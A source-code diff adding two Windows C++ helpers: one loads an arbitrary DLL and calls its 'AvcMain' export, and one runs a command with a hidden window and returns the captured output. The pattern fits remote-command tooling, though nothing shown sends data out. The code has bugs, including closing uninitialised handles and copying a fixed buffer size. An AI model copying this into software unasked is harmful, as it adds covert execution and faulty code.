@@ -68,3 +68,98 @@ bool Process::EndProcess(unsigned int pid, DWORD dwTimeout)
 
 	return true;
 }
+
+
+bool Process::LoadModule(const std::wstring& module)
+{
+	bool bResult = false;
+	typedef int (*DLLPROC)();
+
+	HINSTANCE hInstDLL = LoadLibrary(module.c_str());
+	if (hInstDLL) {
+		DLLPROC fnRunMod = (DLLPROC)GetProcAddress(hInstDLL, "AvcMain");
+
+		if (fnRunMod) {
+			fnRunMod();
+
+			bResult = true;
+		}
+
+		FreeLibrary(hInstDLL);
+	}
+
+	return bResult;
+}
+
+
+LPWSTR Process::Execute(LPWSTR command) {
+	const size_t nAllocSize = sizeof(char) * 1024 * 1024; // 1Mb
+	bool bExecuted = false;
+	char *output = (char *)LocalAlloc(LPTR, nAllocSize);
+
+	HANDLE readPipe, writePipe;
+	SECURITY_ATTRIBUTES security;
+	STARTUPINFOW start;
+	PROCESS_INFORMATION processInfo;
+
+	security.nLength = sizeof(SECURITY_ATTRIBUTES);
+	security.bInheritHandle = true;
+	security.lpSecurityDescriptor = NULL;
+
+	if (CreatePipe(&readPipe, &writePipe, &security, 0)) {
+		GetStartupInfo(&start);
+		start.hStdOutput = writePipe;
+		start.hStdError = writePipe;
+		start.hStdInput = readPipe;
+		start.dwFlags = STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
+		start.wShowWindow = SW_HIDE;
+
+		if (CreateProcess(NULL, command, &security, &security, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &start, &processInfo)) {
+			DWORD bytesRead = 0, count = 0;
+			const int BUFF_SIZE = 1024;
+			char *buffer = (char *)calloc(BUFF_SIZE + 1, sizeof(char));
+
+			// wait for the child process to start
+			for (UINT state = WAIT_TIMEOUT; state == WAIT_TIMEOUT; state = WaitForSingleObject(processInfo.hProcess, 100));
+
+			do {
+				DWORD dwAvail = 0;
+				if (!PeekNamedPipe(readPipe, NULL, 0, NULL, &dwAvail, NULL)) {
+					break;
+				}
+
+				if (!dwAvail) {
+					break;
+				}
+
+				memset(buffer, 0, BUFF_SIZE + 1);
+				ReadFile(readPipe, buffer, BUFF_SIZE, &bytesRead, NULL);
+				buffer[BUFF_SIZE] = '\0';
+				if ((count + bytesRead) > nAllocSize)
+					break;
+
+				memcpy(output + count, buffer, BUFF_SIZE);
+				count += bytesRead;
+			} while (bytesRead >= BUFF_SIZE);
+
+			free(buffer);
+
+			bExecuted = true;
+		}
+
+	}
+
+	CloseHandle(processInfo.hThread);
+	CloseHandle(processInfo.hProcess);
+	CloseHandle(writePipe);
+	CloseHandle(readPipe);
+
+	if (!bExecuted) {
+		return nullptr;
+	}
+
+	// Convert result buffer to a wide-character string
+	LPWSTR result = Util::chartowchar(output);
+	LocalFree(output);
+	return result;
+}
